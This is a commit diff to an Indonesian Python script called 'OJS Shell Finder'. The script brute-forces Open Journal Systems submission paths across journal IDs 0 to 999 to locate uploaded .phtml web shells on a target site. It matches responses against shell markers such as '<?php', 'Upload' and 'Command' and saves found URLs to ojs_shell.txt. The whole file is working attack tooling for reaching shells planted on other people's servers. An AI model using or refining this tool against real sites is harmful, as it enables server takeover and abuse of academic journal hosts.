328de47fa28f2faf7d62636e8791e66143fd418f
Rafaeyfa1337 <127302745+rafaeyfa1337@users.noreply.github.com>
2023-12-09 17:20:27 +0700

    Update find.py

--- find.py
+++ find.py
@@ -1,16 +1,11 @@
 import requests
 import colorama
 import os
-import platform
 from requests import Session
-from colorama import Fore, Style
-from platform import system
+from colorama import Fore
 
 def clear_screen():
-    if system() == 'Linux':
-        os.system('clear')
-    else:
-        os.system('cls')
+    os.system('clear') if os.name == 'posix' else os.system('cls')
 
 session = Session()
 
@@ -18,9 +13,10 @@ def print_banner():
     print(f"""{Fore.YELLOW}
    ___       ___              ___     ____     ______
   / _ \___ _/ _/__ ____ __ __/ _/__ _/ __ \__ / / __/
- / , _/ _ `/ _/ _ `/ -_) // / _/ _ `/ /_/ / // /\ \ 
+ / , _/ _ `/ _/ _ `/ -_) // / _/ _ `/ /_/ / // /\ \  
 /_/|_|\_,_/_/ \_,_/\__/\_, /_/ \_,_/\____/\___/___/  
-                      /___/ {Fore.WHITE}OJS Shell Finder (2.xx & 3.xx)\n\n{Fore.WHITE}[1] Open Journals System Versi 2.xx\n[2] Open Journals System Versi 3.xx\n""")
+                      /___/ {Fore.WHITE}OJS Shell Finder (2.xx & 3.xx)\n
+{Fore.WHITE}[1] Open Journals System Versi 2.xx\n[2] Open Journals System Versi 3.xx""")
 
 headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
@@ -34,44 +30,48 @@ headers = {
 
 def find_ojs_v2():
     try:
-        target = input("Target (contoh: https://example.com): ")
+        url = input("Target (contoh: https://example.com): ")
         custom_dir = input("Directory (contoh: files): ")
-        shell_name = input("Filename (contoh: 31337-1234-5-SM.phtml): ")
-        submission_id = input("Submission ID (contoh: 31337): ")
+        filename = input("Filename (contoh: 31337-1234-5-SM.phtml): ")
+        id = input("Submission ID (contoh: 31337): ")
+        print("\n")
         for i in range(0, 1000):
-            response = session.get(f'{target}/{custom_dir}/journals/{i}/articles/{submission_id}/submission/original/{shell_name}', headers=headers)
-            if any(keyword in response.text.lower() for keyword in ['shell', '-​r​w​-r​--r​--', 'upload', 'ssi', '<?php', '<?', 'command']):
-                print(f'{Fore.GREEN}{target}/{custom_dir}/journals/{i}/articles/{submission_id}/submission/original/{shell_name}{Fore.GREEN} -> FOUND! (saved as: ojs_shell.txt){Fore.WHITE}')
+            r = session.get(f'{url}/{custom_dir}/journals/{i}/articles/{id}/submission/original/{filename}', headers=headers)
+            if 'Shell' in r.text or 'shell' in r.text or '-​r​w​-r​--r​--' in r.text or 'Upload' in r.text or 'SSI' in r.text or '<?php' in r.text or '<?' in r.text or 'Command' in r.text:
+                print(f'{Fore.GREEN}{url}/{custom_dir}/journals/{i}/articles/{id}/submission/original/{filename}{Fore.GREEN} -> FOUND! (saved as: ojs_shell.txt){Fore.WHITE}')
                 with open("ojs_shell.txt", "a+") as f:
-                    f.write(f'{target}/{custom_dir}/journals/{i}/articles/{submission_id}/submission/original/{shell_name}\n')
+                    f.write(f'{url}/{custom_dir}/journals/{i}/articles/{id}/submission/original/{filename}\n')
             else:
-                print(f'{target}/{custom_dir}/journals/{i}/articles/{submission_id}/submission/{shell_name} {Fore.WHITE}->{Fore.RED} NO{Fore.WHITE}')
+                print(f'{url}/{custom_dir}/journals/{i}/articles/{id}/submission/{filename} {Fore.WHITE}->{Fore.RED} NO{Fore.WHITE}')
     except Exception as e:
         print(e)
 
 def find_ojs_v3():
     try:
-        target = input("Target (contoh: https://example.com): ")
+        url = input("Target (contoh: https://example.com): ")
         custom_dir = input("Directory (contoh: files): ")
-        shell_name = input("Filename (contoh: 1175-Article Text-3283-1-2-20230728.phtml ganti jadi 1175-1(INIBISADIRUBAH)-3283-1-2-20230728.phtml): ")
-        submission_id = input("Submission ID (contoh: 1175): ")
+        filename = input("Filename (contoh: 1175-Article Text-3283-1-2-20230728.phtml ganti jadi 1175-1(INIBISADIRUBAH)-3283-1-2-20230728.phtml): ")
+        id = input("Submission ID (contoh: 1175): ")
+        print("\n")
         for i in range(0, 1000):
-            response = session.get(f'{target}/{custom_dir}/journals/{i}/articles/{submission_id}/submission/{shell_name}', headers=headers)
-            if any(keyword in response.text.lower() for keyword in ['shell', '-​r​w​-r​--r​--', 'upload', 'ssi', '<?php', '<?', 'command', 'php license']):
-                print(f'{Fore.GREEN}{target}/{custom_dir}/journals/{i}/articles/{submission_id}/submission/{shell_name}{Fore.GREEN} -> FOUND! (saved as: ojs_shell.txt){Fore.WHITE}')
+            r = session.get(f'{url}/{custom_dir}/journals/{i}/articles/{id}/submission/{filename}', headers=headers)
+            if 'Shell' in r.text or 'shell' in r.text or '-​r​w​-r​--r​--' in r.text or 'Upload' in r.text or 'SSI' in r.text or '<?php' in r.text or '<?' in r.text or 'Command' in r.text:
+                print(f'{Fore.GREEN}{url}/{custom_dir}/journals/{i}/articles/{id}/submission/{filename}{Fore.GREEN} -> FOUND! (saved as: ojs_shell.txt){Fore.WHITE}')
                 with open("ojs_shell.txt", "a+") as f:
-                    f.write(f'{target}/{custom_dir}/journals/{i}/articles/{submission_id}/submission/{shell_name}\n')
+                    f.write(f'{url}/{custom_dir}/journals/{i}/articles/{id}/submission/{filename}\n')
             else:
-                print(f'{target}/{custom_dir}/journals/{i}/articles/{submission_id}/submission/{shell_name} {Fore.WHITE}->{Fore.RED} NO{Fore.WHITE}')
+                print(f'{url}/{custom_dir}/journals/{i}/articles/{id}/submission/{filename} {Fore.WHITE}->{Fore.RED} NO{Fore.WHITE}')
+
     except Exception as e:
         print(e)
 
 clear_screen()
 print_banner()
 option = int(input("Pilih: "))
+
 if option == 1:
     find_ojs_v2()
 elif option == 2:
     find_ojs_v3()
 else:
-    print("Salah pilih bro, yang bener dong xD")
+    print("Pilih yang bener, goblok!")
